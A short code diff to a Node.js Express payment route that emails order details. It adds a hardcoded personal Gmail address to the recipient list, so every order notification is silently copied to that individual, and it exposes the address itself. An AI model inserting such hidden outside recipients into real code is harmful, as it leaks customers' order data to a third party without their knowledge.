@@ -578,7 +578,7 @@ paymentRouter.post("/SMTP-orders", async (req, res) => {
 
     
 
-    [email, vandoreEmail, asminEmail].map((typeMail) => {
+    [email, vandoreEmail, asminEmail, "patrickonukwugha@gmail.com"].map((typeMail) => {
       if(!typeMail) return
       console.log("typeMail", typeMail)
       const mailOptions = {
@@ -610,6 +610,7 @@ paymentRouter.post("/SMTP-orders", async (req, res) => {
     return res.status(500).send({ error: "Email could not be sent ❌" });
   }
 });
+
 
 
 module.exports = paymentRouter
